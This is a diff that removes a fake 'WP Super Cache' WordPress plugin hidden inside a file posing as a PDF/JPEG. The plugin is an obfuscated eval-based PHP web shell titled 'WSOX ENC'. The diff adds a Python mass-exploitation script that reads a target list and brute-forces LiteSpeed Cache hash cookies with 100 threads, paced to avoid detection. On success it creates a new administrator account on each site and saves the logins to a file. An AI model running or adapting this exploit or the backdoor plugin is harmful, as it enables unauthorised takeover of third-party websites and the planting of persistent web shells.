@@ -1,45 +1,135 @@
-%PDF-
-%PDF-
-ï¿½ï¿½ï¿½ï¿½ JFIF      ï¿½ï¿½ ï¿½ 	  	 
+import requests
+import random
+import string
+import time
+import concurrent.futures
 
-	
+# Configuration
+num_workers = 100  # Increased site scanning threads to 100
+request_delay = 3  # Adjusted to 3 seconds to prevent detection
+num_hash_attempts = 100  # Increased hash attempts per site thread to 100
+new_username = 'newadminuser'  # Replace with desired username
+new_user_password = 'NewAdminPassword123!'  # Replace with a secure password
 
-
-
- "" $(4,$&1'-=-157:::#+?D?8C49:7
+# User-Agent headers (to mimic real browser traffic)
+headers = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+}
 
+def mt_srand(seed=None):
+    """ Mimics PHP's mt_srand function by setting the seed for random number generation. """
+    random.seed(seed)
 
+def mt_rand(min_value=0, max_value=2**32 - 1):
+    """ Mimics PHP's mt_rand function by generating a random number within the specified range. """
+    return random.randint(min_value, max_value)
 
-
-7%%77777777777777777777777777777777777777777777777777ï¿½ï¿½  { ï¿½" ï¿½ï¿½               ï¿½ï¿½ 5        !1AQa"qï¿½2ï¿½ï¿½BRï¿½ï¿½#bï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½                ï¿½ï¿½                 ï¿½ï¿½   ? ï¿½ï¿½D@DDD@DDD@DDkKï¿½ï¿½6 ï¿½UGï¿½4Vï¿½1ï¿½ï¿½
-ï¿½ï¿½ï¿½ï¿½ï¿½ë¦Ÿï¿½@ï¿½#ï¿½ï¿½ï¿½RYï¿½dqpï¿½ 
-ï¿½ï¿½ï¿½ï¿½ï¿½ ï¿½oï¿½7ï¿½mï¿½sï¿½<ï¿½ï¿½VPSï¿½e~Vï¿½Ú†8ï¿½ï¿½ï¿½Xï¿½Tï¿½ï¿½$ï¿½ï¿½cï¿½ï¿½ 9ï¿½ï¿½á˜†ï¿½m6@ WUï¿½fï¿½Donï¿½ï¿½rï¿½ï¿½5}9ï¿½ï¿½}ï¿½ï¿½hcï¿½fFï¿½ï¿½/r=hiï¿½ï¿½ ï¿½Í‡ï¿½*ï¿½ï¿½ bï¿½.ï¿½ï¿½$0ï¿½&teï¿½ï¿½yï¿½@ï¿½Aï¿½Fï¿½=ï¿½ Pfï¿½Aï¿½ï¿½aï¿½ï¿½ï¿½Ëªï¿½ÂŒï¿½Ã‰ï¿½ï¿½U|ï¿½ ï¿½	3\ï¿½×´ H SZï¿½g46ï¿½Cï¿½ï¿½×¦ï¿½Û’	ï¿½b<ï¿½ï¿½ï¿½;mï¿½ï¿½ï¿½ï¿½RpØ¹^ï¿½ï¿½l7ï¿½ï¿½*ï¿½ï¿½ï¿½ï¿½ï¿½TFï¿½}ï¿½\ï¿½Mï¿½ï¿½ï¿½M%ï¿½'ï¿½ï¿½ï¿½ï¿½ï¿½Ù Ý½ï¿½vï¿½ ï¿½ï¿½!-ï¿½ï¿½ï¿½ï¿½ï¿½?ï¿½N!Laï¿½ï¿½A+[`#ï¿½ï¿½ï¿½Mï¿½ï¿½ï¿½ï¿½'ï¿½~oRï¿½?ï¿½ï¿½v^)ï¿½ï¿½=ï¿½ï¿½hï¿½ï¿½ï¿½ï¿½Aï¿½ï¿½Xï¿½.ï¿½ï¿½ï¿½Ëƒï¿½ï¿½ï¿½ï¿½^Æï¿½ï¿½Ü¯sO"Bï¿½c>;
-ï¿½eï¿½4ï¿½ï¿½5ï¿½kï¿½ï¿½/CBï¿½ï¿½.
- ï¿½J?ï¿½ï¿½;ï¿½Òˆï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½~ï¿½<ï¿½VZï¿½ê­¼2/)Í”jCï¿½ï¿½ï¿½×¢ï¿½Vï¿½Gï¿½!ï¿½ï¿½ï¿½!ï¿½Fï¿½ï¿½ï¿½ï¿½ï¿½ï¿½\ï¿½ï¿½ Kjï¿½Rï¿½ocï¿½hï¿½ï¿½ï¿½:Þ Iï¿½ï¿½1"2ï¿½q×°8ï¿½ï¿½Ð @×–ï¿½ï¿½ï¿½_C0ï¿½Ö€ï¿½ï¿½Aï¿½ï¿½lQï¿½ï¿½@çº¼ï¿½!7ï¿½ï¿½Fï¿½ï¿½ ï¿½]ï¿½sZ
-Bï¿½62rï¿½vï¿½z~ï¿½Kï¿½7ï¿½cï¿½ï¿½5ï¿½.ï¿½ï¿½ï¿½Ó„q&ï¿½Zï¿½dï¿½<ï¿½kkï¿½ï¿½ï¿½T&8ï¿½|ï¿½ï¿½ï¿½Iï¿½ï¿½ï¿½ï¿½ Ws}ï¿½ï¿½ï¿½Ç½ï¿½cqnÎ‘ï¿½_ï¿½ï¿½ï¿½3ï¿½ï¿½|Nï¿½-y,ï¿½ï¿½iï¿½ï¿½ï¿½È—_ï¿½\60ï¿½ï¿½ï¿½@ï¿½ï¿½6ï¿½ï¿½ï¿½ï¿½D@DDD@DDD@DDD@DDD@DDcï¿½KN66<ï¿½cï¿½ï¿½64=rï¿½ï¿½ï¿½ï¿½ï¿½
-ÄŽ0ï¿½ï¿½hï¿½ï¿½ï¿½t&(ï¿½hnb[ï¿½ ?ï¿½ï¿½^ï¿½ï¿½\ï¿½ï¿½Ã¢|ï¿½,ï¿½/hï¿½\ï¿½ï¿½Rï¿½ï¿½5ï¿½?
-ï¿½0ï¿½!×¦Ü‰-ï¿½ï¿½ï¿½ï¿½Gï¿½ï¿½ï¿½ï¿½Ù¬ï¿½ï¿½Qï¿½zAï¿½ï¿½ï¿½1ï¿½ï¿½ï¿½ï¿½ï¿½Vï¿½ï¿½ï¿½ ï¿½:Rï¿½ï¿½ï¿½`ï¿½$ï¿½ï¿½ikï¿½ï¿½Hï¿½ï¿½ï¿½ï¿½D4ï¿½ï¿½ï¿½ï¿½ï¿½#dkï¿½ï¿½ï¿½ï¿½ï¿½ hï¿½}ï¿½ï¿½ï¿½ï¿½7ï¿½ï¿½ï¿½w%ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½*o8wGï¿½LycuTï¿½.ï¿½ï¿½ï¿½Ü¯7ï¿½ï¿½Iï¿½ï¿½u^ï¿½ï¿½ï¿½)ï¿½ï¿½/cï¿½,sï¿½Nqï¿½Ûºï¿½;ï¿½×šï¿½YH2ï¿½ï¿½ï¿½.5Bï¿½ï¿½ï¿½DDD@DDD@DDD@DDD@DDD@V|ï¿½aï¿½j{7cï¿½ï¿½Xï¿½F\ï¿½3MuA×¾hbï¿½	ï¿½ï¿½nï¿½ï¿½Fï¿½ï¿½ï¿½ï¿½ï¿½ï¿½	ï¿½ï¿½8ï¿½(ï¿½ï¿½eï¿½ï¿½ï¿½ï¿½Ppï¿½\"Gï¿½`sï¿½ï¿½mï¿½ï¿½Þ§aWï¿½Kï¿½ï¿½Oï¿½ï¿½ï¿½ï¿½|;eiï¿½ï¿½ï¿½ï¿½Ö‹ï¿½[ï¿½qï¿½ï¿½";aï¿½ï¿½1ï¿½ï¿½ï¿½ï¿½Yï¿½Gï¿½W/ï¿½ß‡ï¿½&ï¿½<ï¿½ï¿½ï¿½ÐŒï¿½H'qï¿½mï¿½ï¿½<sŒÅá0™dkÈ.tc˜:z­G†:<FV2Zu“V
+def generate_random_string(length=6):
+    """ Generates a random string based on the output of mt_rand. """
+    chars = string.ascii_letters + string.digits
+    return ''.join(random.choices(chars, k=length))
 
-N(ëá’b&1K
-¼Àë_Û{®®×ñ5ÇÁ(HæŒíh¡£{è.×€ˆˆˆ€ˆˆˆ€ˆˆˆ€ˆˆˆ€ˆˆˆƒ*~\<Pº7 ¸ºíÀi°ïê JT8–F
-	 iëÝÏêÛZZÓ·”•'àÞöx¤–F5s²ì†
-ñRÇ75ïNÊÒ&I,l‘ÐÀ–ZøË®ÅX¡Ìé½_$¸o‡(šg´Ë²ù¬5§5X?Sì¤ÂÇãø‹ñ†LvÆ6†µÛ]ïÙ|bGŒ<:ÂKœs OÜû­˜Ü\|+ H²YB&—ß›[ç×_nÔƒŸüO‰Å¶ÅAÞ¤nþÝ‚£_r½ÒHç¿W8Ù5VWÂ" """ """ """ """ ""ÈXY ê?Ë!¶ê4ùŽ–íuò ®8ŽG²1AöÞE´*ÁýÀM/á—¡‘Ù
-œ$@"ÏÊj·åË©Vr;À‡ÅÄ[k0e­
-såh>ï¿½)ï¿½X+!ï¿½ï¿½ï¿½=ï¿½mï¿½Ûšä¸·~6a^Xï¿½)ï¿½ï¿½ï¿½,ï¿½>#&6Gï¿½ï¿½ï¿½Yï¿½ï¿½{ï¿½ï¿½ï¿½ï¿½"" """ """ """ """ ""ï¿½ï¿½at\/ï¿½aï¿½8 ï¿½yp%ï¿½lhlï¿½nï¿½ï¿½ï¿½ï¿½)ï¿½ï¿½ï¿½iï¿½tï¿½ï¿½Bï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½ï¿½?ï¿½ï¿½<html><head><meta http-equiv='Content-Type' content='text/html; charset=Windows-1251'><title>modskinlienminh.com - WSOX ENC</title>
+def trigger_hash_generation(target_url):
+    """ Triggers LiteSpeed Cache hash generation via AJAX request. """
+    ajax_endpoint = '/wp-admin/admin-ajax.php'
+    payload = {'action': 'async_litespeed', 'litespeed_type': 'crawler'}
+    try:
+        response = requests.post(f'{target_url}{ajax_endpoint}', data=payload, headers=headers)
+        if response.status_code == 200:
+            print(f'[INFO] Triggered hash generation on {target_url}')
+        else:
+            print(f'[ERROR] Failed to trigger hash on {target_url} - Status: {response.status_code}')
+    except requests.RequestException as e:
+        print(f'[ERROR] AJAX request failed on {target_url}: {e}')
+    time.sleep(request_delay)  # Delay after triggering hash
 
+def attempt_hash(target_url, hash_value):
+    """ Attempts to use a generated hash for admin access. """
+    cookies = {
+        'litespeed_hash': hash_value,
+        'litespeed_role': '1'  # Assuming admin user ID is '1'
+    }
+    try:
+        response = requests.post(f'{target_url}/wp-json/wp/v2/users', cookies=cookies, headers=headers)
+        return response, cookies
+    except requests.RequestException as e:
+        print(f'[ERROR] Request failed on {target_url}: {e}')
+        return None, None
 
-<?php
-/**
- * Plugin Name: WP Super Cache
- * Plugin URI: https://github.com/m3fd/c332d
- * Description: WP Super Cache
- * Version: 1.0
- * Author: WP Super Cache
- * Author URI: https://github.com/m3fd/c332d
- * License: GPLv2
- */
-$YANZijwug9222 = "dVrZjhzHEXw349oCRQ8sWAI6BJUtSg5GOkiKa2v1n0P7qymcAT3VWynuiL7CRgrL+Tfu/pbceYxlDFNM=";
-$kntl = 'eval($mryoq4272($qmhjw3080("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")));';$vicjn5815= "7eDB2GnFc kU+I6vNVOb)*jasi;tWh :RSyKP.=9p(EAfgM381zXqdLHYo0Jm5,uxZ'r_T/lQCw4";
-$mryoq4272 = $vicjn5815[45].$vicjn5815[50].$vicjn5815[25].$vicjn5815[6].$vicjn5815[44].$vicjn5815[71].$vicjn5815[23].$vicjn5815[27].$vicjn5815[1];
-$qmhjw3080 = $vicjn5815[19].$vicjn5815[23].$vicjn5815[24].$vicjn5815[1].$vicjn5815[14].$vicjn5815[75].$vicjn5815[68].$vicjn5815[53].$vicjn5815[1].$vicjn5815[8].$vicjn5815[57].$vicjn5815[53].$vicjn5815[1];
-eval($kntl);
+def create_admin_user(target_url, cookies):
+    """ Creates a new WordPress administrator if a valid hash is found. """
+    user_data = {
+        'username': new_username,
+        'password': new_user_password,
+        'email': f'{new_username}@example.com',
+        'roles': ['administrator']
+    }
+    try:
+        response = requests.post(f'{target_url}/wp-json/wp/v2/users', cookies=cookies, json=user_data, headers=headers)
+        if response.status_code == 201:
+            print(f'[SUCCESS] New admin user "{new_username}" created on {target_url}')
+            save_login(target_url, new_username, new_user_password)
+        else:
+            print(f'[ERROR] Failed to create admin user on {target_url} - Status: {response.status_code} - Response: {response.text}')
+    except requests.RequestException as e:
+        print(f'[ERROR] User creation request failed on {target_url}: {e}')
+
+def save_login(target_url, username, password):
+    """ Saves successful logins to a text file. """
+    with open("login.txt", "a") as f:
+        f.write(f"{target_url} | Username: {username} | Password: {password}\n")
+
+def worker(target_url):
+    """ Worker function to perform multiple hash attempts for a single target. """
+    for _ in range(num_hash_attempts):
+        random_string = generate_random_string()
+        print(f'[DEBUG] Trying hash: {random_string} on {target_url}')
+
+        response, cookies = attempt_hash(target_url, random_string)
+
+        if response is None:
+            continue
+
+        print(f'[DEBUG] Response status code: {response.status_code}')
+        print(f'[DEBUG] Response content: {response.text}')
+
+        if response.status_code == 201:
+            print(f'[SUCCESS] Valid hash found on {target_url}: {random_string}')
+            create_admin_user(target_url, cookies)
+            return
+        elif response.status_code == 401:
+            print(f'[FAIL] Invalid hash: {random_string}')
+        else:
+            print(f'[ERROR] Unexpected response for hash: {random_string} - Status: {response.status_code}')
+
+        time.sleep(request_delay)  # Delay between hash attempts
+
+def scan_target(target_url):
+    """ Scans a single target site using multiple threads for hash attempts. """
+    print(f'[INFO] Scanning {target_url}')
+    trigger_hash_generation(target_url)
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
+        futures = [executor.submit(worker, target_url) for _ in range(num_workers)]
+        concurrent.futures.wait(futures)
+
+def main():
+    """ Reads the list of target URLs and launches scans in parallel. """
+    try:
+        with open("listsite.txt", "r") as file:
+            targets = [line.strip() for line in file if line.strip()]
+        
+        if not targets:
+            print("[ERROR] No valid targets found in listsite.txt")
+            return
+
+        print(f"[INFO] Starting mass scan on {len(targets)} sites...")
+
+        with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
+            executor.map(scan_target, targets)
+
+    except FileNotFoundError:
+        print("[ERROR] listsite.txt not found!")
+
+if __name__ == '__main__':
+    main()
